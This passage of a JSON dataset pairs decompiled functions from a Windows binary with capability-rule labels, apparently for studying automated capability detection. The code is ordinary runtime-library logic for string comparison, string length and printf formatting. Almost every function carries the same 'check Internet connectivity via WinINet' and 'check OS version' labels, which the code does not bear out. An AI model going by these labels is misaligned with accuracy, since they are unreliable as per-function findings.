+ 4;\n            }\n            else {\n                if (cVar1 == 'U') {\ncode_r0x0048fd75:\n                    *0x56f458 = *0x56f458 + 3;\n                    goto code_r0x0048fd55;\n                }\n                if (cVar1 != 'V') {\n                    if (cVar1 == 'W') {\n                        var_2h._1_1_ = '\\x01';\n                        goto code_r0x0048fd75;\n                    }\n                    if (cVar1 != 'Z') goto code_r0x0048fd55;\n                }\n                *0x56f458 = *0x56f458 + 3;\n            }\n        }\n        else {\ncode_r0x0048fd99:\n            piVar4 = fcn.004053d5(&fcn.00403e5e::var_34h);\ncode_r0x0048fda2:\n            piVar2 = *0x56f454;\n            iVar5 = piVar4[1];\n            iVar7 = *piVar4;\n            var_14h = iVar7;\n            var_10h = iVar5;\n            if ((*0x56f458 - pcVar3 < 2) || (**0x56f454 == 9)) {\ncode_r0x0048fdef:\n                if (iVar7 != 0) {\n                    if (var_2h == '\\0') {\n                        fcn.00403cba(0x2c);\n                    }\n                    fcn.00402eb9(0x48fe0f);\n                    uVar6 = var_8h;\n                    if (var_2h._1_1_ != '\\0') {\n                        var_1ch = 0x54f410;\n                        var_18h = 3;\n                        fcn.00405c95(&fcn.00403e5e::var_1ch);\n                        uVar6 = var_8h;\n                    }\n                    goto code_r0x0048fe3f;\n                }\n            }\n            else if (iVar7 != 0) {\n                piVar4 = fcn.004051dc(8);\n                if (piVar4 != NULL) {\n                    *piVar4 = iVar7;\n                    piVar4[1] = iVar5;\n                    *piVar2 = *piVar2 + 1;\n                    piVar2[*piVar2 + 1] = piVar4;\n                }\n                goto code_r0x0048fdef;\n            }\n            uVar6 = var_8h;\n            if ('\\x01' < iVar5) {\n                arg_8h[1] = 0;\n                *arg_8h = 0;\n                *(arg_8h + 1) = 2;\n                return;\n            }\n        }\ncode_r0x0048fe3f:\n        var_2h._0_1_ = '\\0';\n    } while (uVar6 == '\\0');\n    *0x56f465 = 0;\n    *arg_8h = var_ch;\n    arg_8h[1] = uVar6;\n    return;\n}\n",
        "token_count": 1287
    },
    "00403e6d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpLocaleName\n// WARNING: Variable defined which should be unmapped: var_40h\n\nvoid __cdecl\nfcn.00403e6d(uint arg_8h, uint dwCmpFlags, uint8_t *arg_10h, int32_t arg_14h, uint8_t *arg_18h, int32_t arg_1ch, \n            uint CodePage)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uStack92;\n    uint uStack88;\n    uint8_t *puStack84;\n    int32_t iStack80;\n    uint var_40h;\n    uint lpLocaleName;\n    uint var_30h;\n    uint var_2ch;\n    uint cchWideChar;\n    uint *lpString1;\n    uint var_20h;\n    uint lpMultiByteStr;\n    uint32_t lpCPInfo;\n    uint var_12h;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    if (arg_14h < 1) {\n        if (arg_14h < -1) goto code_r0x00482fdf;\n    }\n    else {\n        iStack80 = 0x482dbe;\n        arg_14h = fcn.004027e8(arg_10h, arg_14h);\n    }\n    if (arg_1ch < 1) {\n        if (arg_1ch < -1) goto code_r0x00482fdf;\n    }\n    else {\n        iStack80 = 0x482dde;\n        arg_1ch = fcn.004027e8(arg_18h, arg_1ch);\n    }\n    if ((arg_14h == 0) || (arg_1ch == 0)) {\n        if ((arg_14h == arg_1ch) || ((1 < arg_1ch || (1 < arg_14h)))) goto code_r0x00482fdf;\n        iStack80 = 0x482e1c;\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetCPInfo)();\n        if (iVar1 == 0) goto code_r0x00482fdf;\n        if (0 < arg_14h) {\n            if (1 < lpCPInfo) {\n                puVar2 = &fcn.00403e6d::var_12h;\n                while (((var_12h != 0 && (*(puVar2 + 1) != 0)) && ((*arg_10h < *puVar2 || (*(puVar2 + 1) < *arg_10h)))))\n                {\n                    puVar2 = puVar2 + 2;\n                    var_12h._0_1_ = *puVar2;\n                }\n            }\n            goto code_r0x00482fdf;\n        }\n        if (0 < arg_1ch) {\n            if ((1 < lpCPInfo) && (puVar2 = &fcn.00403e6d::var_12h,  var_12h != 0)) {\n                while (*(puVar2 + 1) != 0) {\n                    if (((*puVar2 <= *arg_18h) && (*arg_18h <= *(puVar2 + 1))) || (puVar2 = puVar2 + 2,  *puVar2 == 0))\n                    break;\n                }\n            }\n            goto code_r0x00482fdf;\n        }\n    }\n    puStack84 = arg_10h;\n    uStack88 = 9;\n    uStack92 = CodePage;\n    puVar2 = &stack0xffffffa4;\n    iStack80 = arg_14h;\n    iVar1 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)();\n    if (iVar1 == 0) goto code_r0x00482fdf;\n    uVar3 = iVar1 * 2 + 8;\n    uVar3 = -(iVar1 * 2 < uVar3) & uVar3;\n    if (uVar3 != 0) {\n        if (uVar3 < 0x401) {\n            fcn.0040349f();\n            lpString1 = &stack0xffffffa4;\n            if (*0x10 != 0x5c) {\n                uStack92 = 0xcccc;\ncode_r0x00482ef8:\n                lpString1 = puVar2 + 2;\n            }\n        }\n        else {\n            puVar2 = fcn.0040159b(uVar3);\n            lpString1 = puVar2;\n            if (puVar2 != NULL) {\n                *puVar2 = 0xdddd;\n                goto code_r0x00482ef8;\n            }\n        }\n        if ((lpString1 != NULL) &&\n           (iVar4 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(CodePage, 1, arg_10h, arg_14h, lpString1, iVar1), \n           iVar4 != 0)) {\n            puVar2 = &stack0xffffffa4;\n            iVar4 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(CodePage, 9, arg_18h, arg_1ch, 0, 0);\n            if (iVar4 != 0) {\n                uVar3 = iVar4 * 2 + 8;\n                uVar3 = -(iVar4 * 2 < uVar3) & uVar3;\n                if (uVar3 != 0) {\n                    if (uVar3 < 0x401) {\n                        fcn.0040349f();\n                        if (*0x10 != 0x5c) {\n                            uStack92 = 0xcccc;\n                            puVar2 = &stack0xffffffa4;\ncode_r0x00482f7c:\n                            puVar2 = puVar2 + 2;\n                        }\n                    }\n                    else {\n                        puVar2 = fcn.0040159b(uVar3);\n                        if (puVar2 != NULL) {\n                            *puVar2 = 0xdddd;\n                            goto code_r0x00482f7c;\n                        }\n                    }\n                    if ((puVar2 != NULL) &&\n                       (iVar5 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                                          (CodePage, 1, arg_18h, arg_1ch, puVar2, iVar4),  iVar5 != 0)) {\n                        (*_sym.imp.KERNEL32.dll_CompareStringEx)\n                                  (arg_8h, dwCmpFlags, lpString1, iVar1, puVar2, iVar4, 0, 0, 0);\n                    }\n                }\n                fcn.004037ab();\n            }\n        }\n    }\n    fcn.004037ab();\ncode_r0x00482fdf:\n    fcn.00403085(arg_8h);\n    return;\n}\n",
        "token_count": 1538
    },
    "00403f3f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00403f3f(uchar (*arg_8h) [32], uint32_t arg_ch)\n\n{\n    uchar *puVar1;\n    uchar (*pauVar2) [32];\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uchar auVar5 [16];\n    uchar auVar6 [32];\n    uchar in_YMM1 [32];\n    uint8_t uVar7;\n    \n    if (*0x56ec4c < 5) {\n        if (*0x56ec4c < 1) {\n            pauVar2 = arg_8h;\n            if (arg_8h != *arg_8h + arg_ch) {\n                do {\n                    if ((*pauVar2)[0] == '\\0') break;\n                    pauVar2 = *pauVar2 + 1;\n                } while (pauVar2 != *arg_8h + arg_ch);\n            }\n            uVar3 = pauVar2 - arg_8h;\n        }\n        else {\n            uVar4 = -((arg_8h & 0xf) != 0) & 0x10 - (arg_8h & 0xf);\n            if (arg_ch < uVar4) {\n                uVar4 = arg_ch;\n            }\n            pauVar2 = arg_8h;\n            if (arg_8h != *arg_8h + uVar4) {\n                do {\n                    if ((*pauVar2)[0] == '\\0') break;\n                    pauVar2 = *pauVar2 + 1;\n                } while (pauVar2 != *arg_8h + uVar4);\n            }\n            uVar3 = pauVar2 - arg_8h;\n            if (uVar3 == uVar4) {\n                puVar1 = *pauVar2;\n                while ((pauVar2 != puVar1 + (arg_ch - uVar4 & 0xfffffff0) &&\n                       (uVar7 = -((*pauVar2)[0xf] == '\\0'), \n                       auVar5 = CONCAT115(uVar7, CONCAT114(-((*pauVar2)[0xe] == '\\0'), \n                                                           CONCAT113(-((*pauVar2)[0xd] == '\\0'), \n                                                                     CONCAT112(-((*pauVar2)[0xc] == '\\0'), \n                                                                               CONCAT111(-((*pauVar2)[0xb] == '\\0'), \n                                                                                         CONCAT110(-((*pauVar2)[10] ==\n                                                                                                    '\\0'), CONCAT19(-((*\n                                                            pauVar2)[9] == '\\0'), \n                                                            CONCAT18(-((*pauVar2)[8] == '\\0'), \n                                                                     CONCAT17(-((*pauVar2)[7] == '\\0'), \n                                                                              CONCAT16(-((*pauVar2)[6] == '\\0'), \n                                                                                       CONCAT15(-((*pauVar2)[5] == '\\0')\n                                                                                                , CONCAT14(-((*pauVar2)\n                                                                                                             [4] == '\\0'\n                                                                                                            ), CONCAT13(\n                                                            -((*pauVar2)[3] == '\\0'), \n                                                            CONCAT12(-((*pauVar2)[2] == '\\0'), \n                                                                     CONCAT11(-((*pauVar2)[1] == '\\0'), \n                                                                              -((*pauVar2)[0] == '\\0')))))))))))))))), \n                       (SUB161(auVar5 >> 7, 0) & 1 | (SUB161(auVar5 >> 0xf, 0) & 1) << 1 |\n                        (SUB161(auVar5 >> 0x17, 0) & 1) << 2 | (SUB161(auVar5 >> 0x1f, 0) & 1) << 3 |\n                        (SUB161(auVar5 >> 0x27, 0) & 1) << 4 | (SUB161(auVar5 >> 0x2f, 0) & 1) << 5 |\n                        (SUB161(auVar5 >> 0x37, 0) & 1) << 6 | (SUB161(auVar5 >> 0x3f, 0) & 1) << 7 |\n                        (SUB161(auVar5 >> 0x47, 0) & 1) << 8 | (SUB161(auVar5 >> 0x4f, 0) & 1) << 9 |\n                        (SUB161(auVar5 >> 0x57, 0) & 1) << 10 | (SUB161(auVar5 >> 0x5f, 0) & 1) << 0xb |\n                        (SUB161(auVar5 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar5 >> 0x6f, 0) & 1) << 0xd |\n                        (SUB161(auVar5 >> 0x77, 0) & 1) << 0xe | (uVar7 >> 7) << 0xf) == 0))) {\n                    pauVar2 = *pauVar2 + 0x10;\n                }\n                for (; (pauVar2 != *arg_8h + arg_ch && ((*pauVar2)[0] != '\\0')); pauVar2 = *pauVar2 + 1) {\n                }\n                uVar3 = pauVar2 - arg_8h;\n            }\n        }\n    }\n    else {\n        uVar4 = -((arg_8h & 0x1f) != 0) & 0x20 - (arg_8h & 0x1f);\n        if (arg_ch < uVar4) {\n            uVar4 = arg_ch;\n        }\n        pauVar2 = arg_8h;\n        if (arg_8h != *arg_8h + uVar4) {\n            do {\n                if ((*pauVar2)[0] == '\\0') break;\n                pauVar2 = *pauVar2 + 1;\n            } while (pauVar2 != *arg_8h + uVar4);\n        }\n        uVar3 = pauVar2 - arg_8h;\n        if (uVar3 == uVar4) {\n            puVar1 = *pauVar2;\n            auVar5 = vpxor_avx(SUB3216(in_YMM1, 0), SUB3216(in_YMM1, 0));\n            while ((pauVar2 != puVar1 + (arg_ch - uVar4 & 0xffffffe0) &&\n                   (auVar6 = vpcmpeqb_avx2(ZEXT1632(auVar5), *pauVar2), \n                   (SUB321(auVar6 >> 7, 0) & 1 | (SUB321(auVar6 >> 0xf, 0) & 1) << 1 |\n                    (SUB321(auVar6 >> 0x17, 0) & 1) << 2 | (SUB321(auVar6 >> 0x1f, 0) & 1) << 3 |\n                    (SUB321(auVar6 >> 0x27, 0) & 1) << 4 | (SUB321(auVar6 >> 0x2f, 0) & 1) << 5 |\n                    (SUB321(auVar6 >> 0x37, 0) & 1) << 6 | (SUB321(auVar6 >> 0x3f, 0) & 1) << 7 |\n                    (SUB321(auVar6 >> 0x47, 0) & 1) << 8 | (SUB321(auVar6 >> 0x4f, 0) & 1) << 9 |\n                    (SUB321(auVar6 >> 0x57, 0) & 1) << 10 | (SUB321(auVar6 >> 0x5f, 0) & 1) << 0xb |\n                    (SUB321(auVar6 >> 0x67, 0) & 1) << 0xc | (SUB321(auVar6 >> 0x6f, 0) & 1) << 0xd |\n                    (SUB321(auVar6 >> 0x77, 0) & 1) << 0xe | SUB321(auVar6 >> 0x7f, 0) << 0xf |\n                    (SUB321(auVar6 >> 0x87, 0) & 1) << 0x10 | (SUB321(auVar6 >> 0x8f, 0) & 1) << 0x11 |\n                    (SUB321(auVar6 >> 0x97, 0) & 1) << 0x12 | (SUB321(auVar6 >> 0x9f, 0) & 1) << 0x13 |\n                    (SUB321(auVar6 >> 0xa7, 0) & 1) << 0x14 | (SUB321(auVar6 >> 0xaf, 0) & 1) << 0x15 |\n                    (SUB321(auVar6 >> 0xb7, 0) & 1) << 0x16 | SUB321(auVar6 >> 0xbf, 0) << 0x17 |\n                    (SUB321(auVar6 >> 199, 0) & 1) << 0x18 | (SUB321(auVar6 >> 0xcf, 0) & 1) << 0x19 |\n                    (SUB321(auVar6 >> 0xd7, 0) & 1) << 0x1a | (SUB321(auVar6 >> 0xdf, 0) & 1) << 0x1b |\n                    (SUB321(auVar6 >> 0xe7, 0) & 1) << 0x1c | (SUB321(auVar6 >> 0xef, 0) & 1) << 0x1d |\n                    (SUB321(auVar6 >> 0xf7, 0) & 1) << 0x1e | SUB321(auVar6 >> 0xff, 0) << 0x1f) == 0))) {\n                pauVar2 = pauVar2[1];\n            }\n            for (; (pauVar2 != *arg_8h + arg_ch && ((*pauVar2)[0] != '\\0')); pauVar2 = *pauVar2 + 1) {\n            }\n            uVar3 = pauVar2 - arg_8h;\n            vzeroupper_avx();\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 2381
    },
    "00403f4e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00403f4e(uint *arg_8h)\n\n{\n    uint arg_8h_00;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    if (**0x56f458 == '\\0') {\n        fcn.004017df(1);\n        return arg_8h;\n    }\n    fcn.00403deb(&var_8h);\n    fcn.00403cba(0x2e);\n    arg_8h_00 = fcn.00402919(&var_10h, 0, 0);\n    fcn.00402eb9(arg_8h_00);\n    if (**0x56f458 == '@') {\n        *0x56f458 = *0x56f458 + 1;\n        *arg_8h = var_8h;\n        arg_8h[1] = var_4h;\n    }\n    else {\n        arg_8h[1] = 0;\n        *(arg_8h + 1) = 2;\n        *arg_8h = 0;\n    }\n    return arg_8h;\n}\n",
        "token_count": 258
    },
    "00403f5d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403f5d(ushort *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        *arg_8h = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.00403819(in_ECX + 0x464 + uVar1 * 0x10, 1, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 300
    },
    "00403f7b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403f7b(int32_t *arg_8h)\n\n{\n    int32_t *in_ECX;\n    \n    if (*(in_ECX + 1) == '\\0') {\n        fcn.004019e7();\n    }\n    if (*(arg_8h + 1) == '\\0') {\n        fcn.004019e7();\n    }\n    if (*in_ECX == 0) {\n        if (*arg_8h != 0) {\n            return 0;\n        }\n    }\n    else if (*arg_8h == 0) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 143
    },
    "00403fbc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00403fbc(int32_t arg_8h)\n\n{\n    int32_t arg_8h_00;\n    uint32_t uVar1;\n    int32_t *var_4h;\n    \n    if (*0x57004c == 0) {\n        if (arg_8h + 1U < 0x101) {\n            return *(*0x56ce78 + arg_8h * 2) & 2;\n        }\n    }\n    else {\n        arg_8h_00 = fcn.00404331();\n        var_4h = *(arg_8h_00 + 0x4c);\n        fcn.004043d1(arg_8h_00, &var_4h);\n        if (arg_8h + 1U < 0x101) {\n            return *(*var_4h + arg_8h * 2) & 2;\n        }\n        if (1 < var_4h[1]) {\n            uVar1 = fcn.00404287(arg_8h, 2, 0);\n            return uVar1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 258
    },
    "0040406b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040406b(uint32_t *param_1)\n\n{\n    uint32_t *arg_8h;\n    int16_t iVar1;\n    uint16_t *puVar2;\n    bool bVar3;\n    bool bVar4;\n    char cVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    int32_t arg_ch;\n    int32_t arg_10h;\n    uint unaff_ESI;\n    ushort uVar8;\n    uint16_t uVar9;\n    uint arg_8h_00;\n    uint arg_ch_00;\n    int32_t iStack20;\n    uint uStack16;\n    ushort uStack12;\n    uint16_t *puStack8;\n    \n    uVar9 = *(param_1 + 0x32);\n    puStack8 = uVar9;\n    if (puStack8 != 0x46) {\n        if (puStack8 == 0x4e) {\n            puStack8 = *param_1 & 8;\n            if (puStack8 != NULL) goto code_r0x0049d9dc;\n            param_1[7] = 8;\ncode_r0x0049d8a7:\n            puStack8 = 0x49d8ac;\n            puVar6 = fcn.004039a4();\n            *puVar6 = 0x16;\n            puStack8 = 0x49d8b7;\n            uVar7 = fcn.00403751();\n            return uVar7 & 0xffffff00;\n        }\n        if (param_1[0xb] != 0) goto code_r0x0049d8a7;\n        if (uVar9 < 0x6b) {\n            if (uVar9 == 0x6a) {\n                param_1[0xb] = 5;\n                goto code_r0x0049d9dc;\n            }\n            if (puStack8 == 0x49) {\n                puVar2 = param_1[4];\n                puStack8 = *puVar2;\n                if ((puStack8 == 0x33) && (puVar2[1] == 0x32)) {\n                    puStack8 = puVar2 + 2;\n                    param_1[0xb] = 10;\n                    param_1[4] = puStack8;\n                }\n                else if ((puStack8 == 0x36) && (puVar2[1] == 0x34)) {\n                    puStack8 = puVar2 + 2;\n                    param_1[0xb] = 0xb;\n                    param_1[4] = puStack8;\n                }\n                else if (((((puStack8 == 0x64) || (puStack8 == 0x69)) || (puStack8 == 0x6f)) ||\n                         ((puStack8 == 0x75 || (puStack8 == 0x78)))) || (puStack8 == 0x58)) {\n                    param_1[0xb] = 9;\n                }\n                goto code_r0x0049d9dc;\n            }\n            if (puStack8 == 0x4c) {\n                param_1[0xb] = 8;\n                goto code_r0x0049d9dc;\n            }\n            if (puStack8 == 0x54) {\n                param_1[0xb] = 0xd;\n                goto code_r0x0049d9dc;\n            }\n            if (uVar9 != 0x68) goto code_r0x0049d9dc;\n            if (*param_1[4] == 0x68) {\n                param_1[4] = param_1[4] + 1;\n                puStack8 = 0x1;\n            }\n            else {\n                puStack8 = 0x2;\n            }\n        }\n        else {\n            if (uVar9 != 0x6c) {\n                if (puStack8 == 0x74) {\n                    param_1[0xb] = 7;\n                }\n                else if (puStack8 == 0x77) {\n                    param_1[0xb] = 0xc;\n                }\n                else if (puStack8 == 0x7a) {\n                    param_1[0xb] = 6;\n                }\n                goto code_r0x0049d9dc;\n            }\n            if (*param_1[4] == 0x6c) {\n                param_1[4] = param_1[4] + 1;\n                puStack8 = 0x4;\n            }\n            else {\n                puStack8 = 0x3;\n            }\n        }\n        param_1[0xb] = puStack8;\ncode_r0x0049d9dc:\n        return CONCAT31(puStack8 >> 8, 1);\n    }\n    puStack8 = *param_1 & 8;\n    if (puStack8 != NULL) goto code_r0x0049d9dc;\n    param_1[7] = 7;\n    puStack8 = *0x56cca8 ^ &stack0xfffffffc;\n    uVar9 = *(param_1 + 0x32);\n    if (uVar9 < 0x65) {\n        if (uVar9 == 100) {\ncode_r0x0049f5e3:\n            param_1[8] = param_1[8] | 0x10;\ncode_r0x0049f5e7:\n            arg_ch_00 = 0;\n            arg_8h_00 = 10;\ncode_r0x0049f5ea:\n            cVar5 = fcn.00403ed6(arg_8h_00, arg_ch_00);\n        }\n        else if (uVar9 < 0x59) {\n            if (uVar9 == 0x58) {\n                arg_ch_00 = 1;\ncode_r0x0049f58f:\n                arg_8h_00 = 0x10;\n                goto code_r0x0049f5ea;\n            }\n            if (uVar9 != 0x41) {\n                if (uVar9 == 0x43) goto code_r0x0049f5a3;\n                if (uVar9 < 0x45) goto code_r0x0049f782;\n                if (0x47 < uVar9) {\n                    if (uVar9 != 0x53) goto code_r0x0049f782;\n                    goto code_r0x0049f577;\n                }\n            }\ncode_r0x0049f5f3:\n            cVar5 = fcn.004063d4();\n        }\n        else if (uVar9 == 0x5a) {\n            cVar5 = fcn.00403f35();\n        }\n        else {\n            if (uVar9 == 0x61) goto code_r0x0049f5f3;\n            if (uVar9 != 99) goto code_r0x0049f782;\ncode_r0x0049f5a3:\n            cVar5 = fcn.00404291(0);\n        }\n    }\n    else if (uVar9 < 0x71) {\n        if (uVar9 == 0x70) {\n            cVar5 = fcn.00405867();\n        }\n        else {\n            if (uVar9 < 0x68) goto code_r0x0049f5f3;\n            if (uVar9 == 0x69) goto code_r0x0049f5e3;\n            if (uVar9 == 0x6e) {\n                cVar5 = fcn.00401c26();\n            }\n            else {\n                if (uVar9 != 0x6f) goto code_r0x0049f782;\n                cVar5 = fcn.00405704();\n            }\n        }\n    }\n    else {\n        if (uVar9 != 0x73) {\n            if (uVar9 != 0x75) {\n                if (uVar9 != 0x78) goto code_r0x0049f782;\n                arg_ch_00 = 0;\n                goto code_r0x0049f58f;\n            }\n            goto code_r0x0049f5e7;\n        }\ncode_r0x0049f577:\n        cVar5 = fcn.00402ee1();\n    }\n    if (((cVar5 == '\\0') || (cVar5 = fcn.00403571(),  cVar5 != '\\0')) || (*(param_1 + 0xc) != '\\0'))\n    goto code_r0x0049f782;\n    arg_ch = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uVar7 = param_1[8];\n    iStack20 = 0;\n    if ((uVar7 >> 4 & 1) != 0) {\n        if ((uVar7 >> 6 & 1) == 0) {\n            if ((uVar7 & 1) == 0) {\n                if ((uVar7 >> 1 & 1) != 0) {\n                    uStack16 = 0x20;\n                    arg_ch = 1;\n                    iStack20 = 1;\n                }\n                goto code_r0x0049f68d;\n            }\n            uVar9 = 0x2b;\n        }\n        else {\n            uVar9 = 0x2d;\n        }\n        uStack16 = uVar9;\n        iStack20 = 1;\n        arg_ch = 1;\n    }\ncode_r0x0049f68d:\n    iVar1 = *(param_1 + 0x32);\n    if (((iVar1 == 0x78) || (iVar1 == 0x58)) && ((uVar7 >> 5 & 1) != 0)) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((iVar1 == 0x61) || (iVar1 == 0x41)) {\n        bVar4 = true;\n    }\n    else {\n        bVar4 = false;\n    }\n    if ((bVar3) || (bVar4)) {\n        *(&stack0xfffffff0 + arg_ch * 2) = 0x30;\n        if ((iVar1 == 0x58) || (uVar8 = 0x78,  iVar1 == 0x41)) {\n            uVar8 = 0x58;\n        }\n        *(&stack0xfffffff2 + arg_ch * 2) = uVar8;\n        arg_ch = arg_ch + 2;\n        iStack20 = arg_ch;\n    }\n    arg_8h = param_1 + 0x112;\n    arg_10h = (param_1[9] - param_1[0xe]) - arg_ch;\n    if ((*(param_1 + 8) & 0xc) == 0) {\n        fcn.00405afb(arg_8h, 0x20, arg_10h, param_1 + 6);\n        arg_ch = iStack20;\n    }\n    fcn.00404043(&stack0xfffffff0, arg_ch, param_1 + 6, param_1 + 3);\n    if (((param_1[8] >> 3 & 1) != 0) && ((param_1[8] >> 2 & 1) == 0)) {\n        fcn.00405afb(arg_8h, 0x30, arg_10h, param_1 + 6);\n    }\n    fcn.004042aa(0);\n    if ((-1 < param_1[6]) && ((param_1[8] >> 2 & 1) != 0)) {\n        fcn.00405afb(arg_8h, 0x20, arg_10h, param_1 + 6);\n    }\ncode_r0x0049f782:\n    uVar7 = fcn.00403085(unaff_ESI);\n    return uVar7;\n}\n",
        "token_count": 2682
    },
    "004040f2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nulong __cdecl fcn.004040f2(uint arg_8h)\n\n{\n    uint *puVar1;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    ulong uVar2;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00402289(0x56b418, 0x10);\n    if (*(unaff_EBP + 8) == 0) {\n        puVar1 = fcn.004039a4();\n        *puVar1 = 0x16;\n        fcn.00403751();\n        uVar2 = 0xffffffffffffffff;\n    }\n    else {\n        *(unaff_EBP + -0x20) = 0;\n        *(unaff_EBP + -0x1c) = 0;\n        fcn.004013f7(*(unaff_EBP + 8));\n        *(unaff_EBP + -4) = 0;\n        uVar2 = fcn.004d01bc(*(unaff_EBP + 8));\n        *(unaff_EBP + -0x20) = uVar2;\n        *(unaff_EBP + -0x1c) = uVar2 >> 0x20;\n        *(unaff_EBP + -4) = 0xfffffffe;\n        fcn.004d015d(0x56b418);\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar2;\n}\n",
        "token_count": 356
    },
    "00404110": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404110(int32_t param_1)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint16_t *puVar4;\n    int32_t in_stack_ffffffdc;\n    int32_t var_10h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    if ((*(param_1 + 0x3c) == '\\0') || (*(param_1 + 0x38) < 1)) {\n        in_stack_ffffffdc = param_1 + 0xc;\n        fcn.00405df8(*(param_1 + 0x34), *(param_1 + 0x38), param_1 + 0x18, in_stack_ffffffdc);\n    }\n    else {\n        puVar4 = *(param_1 + 0x34);\n        iVar3 = 0;\n        do {\n            uVar1 = *puVar4;\n            puVar4 = puVar4 + 1;\n            var_10h = 0;\n            iVar2 = fcn.00401f32(&var_10h, &var_ch, 6, uVar1, *(param_1 + 8));\n            if ((iVar2 != 0) || (var_10h == 0)) {\n                *(param_1 + 0x18) = 0xffffffff;\n                break;\n            }\n            fcn.00405df8(&var_ch, var_10h, param_1 + 0x18, param_1 + 0xc);\n            iVar3 = iVar3 + 1;\n        } while (iVar3 != *(param_1 + 0x38));\n    }\n    fcn.00403085(in_stack_ffffffdc);\n    return;\n}\n",
        "token_count": 412
    },
    "00404156": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
